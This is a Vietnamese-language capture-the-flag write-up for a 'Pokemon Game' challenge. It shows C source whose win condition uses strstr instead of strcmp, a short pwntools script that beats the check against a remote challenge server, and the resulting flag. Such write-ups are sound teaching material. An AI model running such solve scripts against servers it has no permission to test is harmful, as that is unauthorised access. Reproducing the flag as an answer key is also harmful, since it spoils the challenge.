# Pokemon Game (Pwn)

Bài cho sẵn source code

{% code lineNumbers="true" %}
```c
#include<stdio.h>
#include<string.h>
#include<time.h>
#include<stdlib.h>

void win(){
	system("cat flag.txt");
}

char *pokemons[3] = {"Bulbasaur", "Charmander", "Squirtle"};
char *pokemonss[3] = {"Charmander", "Squirtle", "Bulbasaur"};
int times = 0;

int read_line(char *buf, int n)
{
    for (int i = 0; i < n; ++i)
    {
        if (fread(buf + i, 1, 1, stdin) != 1)
        {
            puts("Fatal error!");
            exit(-1);
        }
        if (buf[i] == '\n')
        {
            buf[i] = '\0';
            return i;
        }
    }

    buf[n - 1] = '\0';
    return n;
}

int Play(){
	char choice[30];
	srand(time(NULL));
he:
	printf("Your choice: ");
	read_line(choice, sizeof(choice));
	if(!strcmp(choice,"Bulbasaur")){
		printf("\nYou choose the Bulbasaur\n");
	}
	else if(!strcmp(choice,"Charmander")){
		printf("\nYou choose the Charmander\n");
	}	
	else if(!strcmp(choice,"Squirtle")){
		printf("\nYou choose the Squirtle\n");
	}
	int computer = rand()%3;
	printf("The computer choose: %s\n", pokemons[computer]);
	if(strstr(choice, pokemonss[computer])){
		printf("You win. Do you want to continue playing?\n\n");
		return 1;
	}
	else{
		printf("You lose, play again?\n\n");
		return 0;
	}
}

int main(){
	setvbuf(stdin, 0LL, 2, 0LL);
	setvbuf(stdout, 0LL, 2, 0LL);
	
	printf("--------WELCOME TO POKEMON GAME--------\n")	;
	printf("Choose one of the following three pokemons to start the game:\n\n");
	printf("---\nBulbasaur\nCharmander\nSquirtle\n---\n");   	
	printf("You need to beat a computer pokemon 10 times to win this game.\n");
	printf("Hint: Pokemon counter each other, you need to choose the right pokemon to win.\n\n");
	while(1){
		if(Play()){
			times++;
		}	
		else{
			times--;
		}
		if(times==5){
			printf("You are winning %d times, come on!!\n\n", times);
		} 
		if(times>10){
			printf("Congrats. You win the game, here is your gift: ");
			win();
		}
	}
	return 0;
}

```
{% endcode %}

Bài này dính lỗi ở line 51, dùng hàm `strstr` thay vì hàm `strcmp`. Hàm `strstr` chỉ kiểm tra `pokemonss[computer]` có ở trong `choice` hay không.

Chỉ cần ghi biến choice chứa hết các string của `pokemonss.`

Script giải:

{% code lineNumbers="true" %}
```python
from pwn import *
from time import sleep
p=remote("45.122.249.68",10017)

p.recv()
for i in range(11):
	p.sendline(b"BulbasaurCharmanderSquirtle")
	sleep(1)
p.interactive()
	

```
{% endcode %}

<figure><img src="../../.gitbook/assets/Screenshot 2022-10-11 134349.png" alt=""><figcaption></figcaption></figure>

Flag: `W1{MU_VODICHHHHHHHHHHHHHHHHHHHHHHHHHHHH}`
